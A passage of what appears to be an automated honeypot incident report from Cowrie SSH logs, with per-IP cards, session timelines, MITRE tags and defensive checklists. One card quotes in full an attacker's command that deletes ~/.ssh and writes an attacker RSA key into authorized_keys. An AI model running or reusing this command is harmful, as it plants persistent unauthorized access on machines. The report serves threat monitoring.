| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:23:05` | `cowrie.session.connect` |
| `2026-08-08 02:23:06` | `cowrie.client.version` |
| `2026-08-08 02:23:06` | `cowrie.client.kex` |
| `2026-08-08 02:23:07` | `cowrie.login.success` |
| `2026-08-08 02:23:08` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3118c31a0b4

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-08-08 02:23 |
| **Last Seen** | 2026-08-08 02:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:23:20` | `cowrie.session.connect` |
| `2026-08-08 02:23:20` | `cowrie.client.version` |
| `2026-08-08 02:23:20` | `cowrie.client.kex` |
| `2026-08-08 02:23:21` | `cowrie.login.success` |
| `2026-08-08 02:23:22` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78baf6da6b69

| Field | Detail |
|---|---|
| **Source IP** | `210.222.70[.]61` |
| **First Seen** | 2026-08-08 02:23 |
| **Last Seen** | 2026-08-08 02:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:23:27` | `cowrie.session.connect` |
| `2026-08-08 02:23:28` | `cowrie.client.version` |
| `2026-08-08 02:23:28` | `cowrie.client.kex` |
| `2026-08-08 02:23:30` | `cowrie.login.success` |
| `2026-08-08 02:23:31` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.222.70[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.222.70[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12b85262b7a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:24 |
| **Last Seen** | 2026-08-08 02:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:24:11` | `cowrie.session.connect` |
| `2026-08-08 02:24:11` | `cowrie.client.version` |
| `2026-08-08 02:24:11` | `cowrie.client.kex` |
| `2026-08-08 02:24:11` | `cowrie.login.success` |
| `2026-08-08 02:24:12` | `cowrie.session.params` |
| `2026-08-08 02:24:12` | `cowrie.command.input` |
| `2026-08-08 02:24:12` | `cowrie.log.closed` |
| `2026-08-08 02:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7d8e55965d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:25 |
| **Last Seen** | 2026-08-08 02:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:25:53` | `cowrie.session.connect` |
| `2026-08-08 02:25:53` | `cowrie.client.version` |
| `2026-08-08 02:25:53` | `cowrie.client.kex` |
| `2026-08-08 02:25:53` | `cowrie.login.success` |
| `2026-08-08 02:25:54` | `cowrie.session.params` |
| `2026-08-08 02:25:54` | `cowrie.command.input` |
| `2026-08-08 02:25:54` | `cowrie.log.closed` |
| `2026-08-08 02:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598d14ee9317

| Field | Detail |
|---|---|
| **Source IP** | `125.88.225[.]11` |
| **First Seen** | 2026-08-08 02:26 |
| **Last Seen** | 2026-08-08 02:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:26:08` | `cowrie.session.connect` |
| `2026-08-08 02:26:08` | `cowrie.client.version` |
| `2026-08-08 02:26:08` | `cowrie.client.kex` |
| `2026-08-08 02:26:09` | `cowrie.login.success` |
| `2026-08-08 02:26:10` | `cowrie.session.params` |
| `2026-08-08 02:26:10` | `cowrie.command.input` |
| `2026-08-08 02:26:10` | `cowrie.command.failed` |
| `2026-08-08 02:26:10` | `cowrie.log.closed` |
| `2026-08-08 02:26:11` | `cowrie.session.params` |
| `2026-08-08 02:26:11` | `cowrie.command.input` |
| `2026-08-08 02:26:11` | `cowrie.session.file_download` |
| `2026-08-08 02:26:11` | `cowrie.log.closed` |
| `2026-08-08 02:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.88.225[.]11` to AbuseIPDB if not already reported
- [ ] Block `125.88.225[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1653b42800a6

| Field | Detail |
|---|---|
| **Source IP** | `125.88.225[.]11` |
| **First Seen** | 2026-08-08 02:26 |
| **Last Seen** | 2026-08-08 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:26:11` | `cowrie.session.connect` |
| `2026-08-08 02:26:11` | `cowrie.client.version` |
| `2026-08-08 02:26:12` | `cowrie.client.kex` |
| `2026-08-08 02:26:13` | `cowrie.login.success` |
| `2026-08-08 02:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.88.225[.]11` to AbuseIPDB if not already reported
- [ ] Block `125.88.225[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5df2f926f937

| Field | Detail |
|---|---|
| **Source IP** | `125.88.225[.]11` |
| **First Seen** | 2026-08-08 02:26 |
| **Last Seen** | 2026-08-08 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:26:13` | `cowrie.session.connect` |
| `2026-08-08 02:26:13` | `cowrie.client.version` |
| `2026-08-08 02:26:13` | `cowrie.client.kex` |
| `2026-08-08 02:26:14` | `cowrie.login.success` |
| `2026-08-08 02:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.88.225[.]11` to AbuseIPDB if not already reported
- [ ] Block `125.88.225[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3742aa1dd9af

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:27 |
| **Last Seen** | 2026-08-08 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:27:30` | `cowrie.session.connect` |
| `2026-08-08 02:27:30` | `cowrie.client.version` |
| `2026-08-08 02:27:30` | `cowrie.client.kex` |
| `2026-08-08 02:27:30` | `cowrie.login.success` |
| `2026-08-08 02:27:31` | `cowrie.session.params` |
| `2026-08-08 02:27:31` | `cowrie.command.input` |
| `2026-08-08 02:27:31` | `cowrie.log.closed` |
| `2026-08-08 02:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a334d49bec7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:29 |
| **Last Seen** | 2026-08-08 02:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:29:12` | `cowrie.session.connect` |
| `2026-08-08 02:29:12` | `cowrie.client.version` |
| `2026-08-08 02:29:12` | `cowrie.client.kex` |
| `2026-08-08 02:29:12` | `cowrie.login.success` |
| `2026-08-08 02:29:13` | `cowrie.session.params` |
| `2026-08-08 02:29:13` | `cowrie.command.input` |
| `2026-08-08 02:29:13` | `cowrie.log.closed` |
| `2026-08-08 02:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd52f6bf1b4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:30 |
| **Last Seen** | 2026-08-08 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:30:59` | `cowrie.session.connect` |
| `2026-08-08 02:30:59` | `cowrie.client.version` |
| `2026-08-08 02:30:59` | `cowrie.client.kex` |
| `2026-08-08 02:30:59` | `cowrie.login.success` |
| `2026-08-08 02:31:00` | `cowrie.session.params` |
| `2026-08-08 02:31:00` | `cowrie.command.input` |
| `2026-08-08 02:31:00` | `cowrie.log.closed` |
| `2026-08-08 02:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6469b31150bb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:32 |
| **Last Seen** | 2026-08-08 02:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:32:45` | `cowrie.session.connect` |
| `2026-08-08 02:32:45` | `cowrie.client.version` |
| `2026-08-08 02:32:45` | `cowrie.client.kex` |
| `2026-08-08 02:32:45` | `cowrie.login.success` |
| `2026-08-08 02:32:46` | `cowrie.session.params` |
| `2026-08-08 02:32:46` | `cowrie.command.input` |
| `2026-08-08 02:32:46` | `cowrie.log.closed` |
| `2026-08-08 02:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c966cbf7c0d5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-08-08 02:34 |
| **Last Seen** | 2026-08-08 02:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:34:05` | `cowrie.session.connect` |
| `2026-08-08 02:34:05` | `cowrie.client.version` |
| `2026-08-08 02:34:05` | `cowrie.client.kex` |
| `2026-08-08 02:34:06` | `cowrie.login.success` |
| `2026-08-08 02:34:07` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77fadc3fd8c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]208` |
| **First Seen** | 2026-08-08 02:34 |
| **Last Seen** | 2026-08-08 02:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:34:16` | `cowrie.session.connect` |
| `2026-08-08 02:34:17` | `cowrie.client.version` |
| `2026-08-08 02:34:17` | `cowrie.client.kex` |
| `2026-08-08 02:34:19` | `cowrie.login.success` |
| `2026-08-08 02:34:20` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.104[.]208` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7641fc53027

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:34 |
| **Last Seen** | 2026-08-08 02:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:34:27` | `cowrie.session.connect` |
| `2026-08-08 02:34:27` | `cowrie.client.version` |
| `2026-08-08 02:34:27` | `cowrie.client.kex` |
| `2026-08-08 02:34:27` | `cowrie.login.success` |
| `2026-08-08 02:34:28` | `cowrie.session.params` |
| `2026-08-08 02:34:28` | `cowrie.command.input` |
| `2026-08-08 02:34:28` | `cowrie.log.closed` |
| `2026-08-08 02:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542bc73c8961

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 02:34 |
| **Last Seen** | 2026-08-08 02:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:34:27` | `cowrie.session.connect` |
| `2026-08-08 02:34:27` | `cowrie.client.version` |
| `2026-08-08 02:34:27` | `cowrie.client.kex` |
| `2026-08-08 02:34:28` | `cowrie.login.success` |
| `2026-08-08 02:34:28` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:34:28` | `cowrie.direct-tcpip.data` |
| `2026-08-08 02:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530e4ad9e5da

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:36 |
| **Last Seen** | 2026-08-08 02:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:36:11` | `cowrie.session.connect` |
| `2026-08-08 02:36:11` | `cowrie.client.version` |
| `2026-08-08 02:36:11` | `cowrie.client.kex` |
| `2026-08-08 02:36:11` | `cowrie.login.success` |
| `2026-08-08 02:36:12` | `cowrie.session.params` |
| `2026-08-08 02:36:12` | `cowrie.command.input` |
| `2026-08-08 02:36:12` | `cowrie.log.closed` |
| `2026-08-08 02:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0469436c9009

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:37 |
| **Last Seen** | 2026-08-08 02:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:37:55` | `cowrie.session.connect` |
| `2026-08-08 02:37:55` | `cowrie.client.version` |
| `2026-08-08 02:37:55` | `cowrie.client.kex` |
| `2026-08-08 02:37:55` | `cowrie.login.success` |
| `2026-08-08 02:37:56` | `cowrie.session.params` |
| `2026-08-08 02:37:56` | `cowrie.command.input` |
| `2026-08-08 02:37:56` | `cowrie.log.closed` |
| `2026-08-08 02:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03c3849a5f2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:39 |
| **Last Seen** | 2026-08-08 02:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:39:35` | `cowrie.session.connect` |
| `2026-08-08 02:39:35` | `cowrie.client.version` |
| `2026-08-08 02:39:35` | `cowrie.client.kex` |
| `2026-08-08 02:39:35` | `cowrie.login.success` |
| `2026-08-08 02:39:36` | `cowrie.session.params` |
| `2026-08-08 02:39:36` | `cowrie.command.input` |
| `2026-08-08 02:39:36` | `cowrie.log.closed` |
| `2026-08-08 02:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a7e7541df9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:41 |
| **Last Seen** | 2026-08-08 02:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:41:13` | `cowrie.session.connect` |
| `2026-08-08 02:41:13` | `cowrie.client.version` |
| `2026-08-08 02:41:13` | `cowrie.client.kex` |
| `2026-08-08 02:41:14` | `cowrie.login.success` |
| `2026-08-08 02:41:15` | `cowrie.session.params` |
| `2026-08-08 02:41:15` | `cowrie.command.input` |
| `2026-08-08 02:41:15` | `cowrie.log.closed` |
| `2026-08-08 02:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dbf3c0144f4

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-08-08 02:42 |
| **Last Seen** | 2026-08-08 02:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:42:22` | `cowrie.session.connect` |
| `2026-08-08 02:42:23` | `cowrie.client.version` |
| `2026-08-08 02:42:23` | `cowrie.client.kex` |
| `2026-08-08 02:42:25` | `cowrie.login.success` |
| `2026-08-08 02:42:26` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5923067cc2a1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:42 |
| **Last Seen** | 2026-08-08 02:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:42:59` | `cowrie.session.connect` |
| `2026-08-08 02:42:59` | `cowrie.client.version` |
| `2026-08-08 02:42:59` | `cowrie.client.kex` |
| `2026-08-08 02:42:59` | `cowrie.login.success` |
| `2026-08-08 02:43:00` | `cowrie.session.params` |
| `2026-08-08 02:43:00` | `cowrie.command.input` |
| `2026-08-08 02:43:00` | `cowrie.log.closed` |
| `2026-08-08 02:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c4ecbae974

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-08-08 02:43 |
| **Last Seen** | 2026-08-08 02:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:43:00` | `cowrie.session.connect` |
| `2026-08-08 02:43:00` | `cowrie.client.version` |
| `2026-08-08 02:43:00` | `cowrie.client.kex` |
| `2026-08-08 02:43:01` | `cowrie.login.success` |
| `2026-08-08 02:43:02` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d89a56b78c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:44 |
| **Last Seen** | 2026-08-08 02:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:44:46` | `cowrie.session.connect` |
| `2026-08-08 02:44:46` | `cowrie.client.version` |
| `2026-08-08 02:44:46` | `cowrie.client.kex` |
| `2026-08-08 02:44:47` | `cowrie.login.success` |
| `2026-08-08 02:44:48` | `cowrie.session.params` |
| `2026-08-08 02:44:48` | `cowrie.command.input` |
| `2026-08-08 02:44:48` | `cowrie.log.closed` |
| `2026-08-08 02:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76420f1df3d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:46 |
| **Last Seen** | 2026-08-08 02:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:46:30` | `cowrie.session.connect` |
| `2026-08-08 02:46:30` | `cowrie.client.version` |
| `2026-08-08 02:46:30` | `cowrie.client.kex` |
| `2026-08-08 02:46:30` | `cowrie.login.success` |
| `2026-08-08 02:46:31` | `cowrie.session.params` |
| `2026-08-08 02:46:31` | `cowrie.command.input` |
| `2026-08-08 02:46:31` | `cowrie.log.closed` |
| `2026-08-08 02:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
